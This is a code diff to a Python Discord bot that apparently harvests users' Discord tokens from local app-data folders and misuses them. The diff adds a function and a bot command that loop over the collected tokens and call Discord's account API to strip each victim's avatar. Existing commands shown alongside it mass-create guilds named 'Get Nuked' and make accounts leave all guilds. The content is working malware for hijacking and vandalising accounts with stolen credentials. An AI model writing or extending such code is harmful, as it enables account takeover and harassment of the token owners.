@@ -16,6 +16,18 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 tokens = []
 
+def remove_pfp_backend(token):
+    headers = {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+    "authorization": token
+    }
+    json = {
+        "avatar": "null"
+    }
+    rq = requests.patch('https://discord.com/api/v8/users/@me', headers=headers, json=json)
+    print("code: " + str(rq.status_code))        
+
+
 def change_theme_backend(token, theme):
     headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
@@ -176,6 +188,11 @@ async def create_guilds(ctx, args):
     args = int(args)
     for _ in range(args):
         await bot.create_guild(name="Get Nuked")
+
+@bot.command()
+async def remove_pfp(ctx):
+    for token in tokens:
+        remove_pfp_backend(token)
 
 @bot.command()
 async def leave_all_guilds(ctx):
